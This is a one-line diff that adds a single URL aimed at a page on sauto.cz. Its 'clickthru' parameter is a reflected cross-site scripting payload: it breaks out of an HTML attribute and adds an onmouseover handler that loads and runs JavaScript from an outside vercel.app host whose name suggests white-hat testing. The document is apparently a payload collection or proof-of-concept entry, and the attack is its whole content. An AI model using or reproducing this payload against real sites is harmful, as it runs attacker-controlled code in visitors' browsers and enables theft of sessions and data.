@@ -1,0 +1,1 @@
+https://www.sauto.cz/bannerova-reklama?perPage=1&banner=1&clickthru=/%22onmouseover=%22let%20s%20=%20document.createElement(%27script%27);%20s.setAttribute(%27src%27,%27https://whitehat-email-cz-cjqw.vercel.app/index.js%27);%20document.head.appendChild(s)
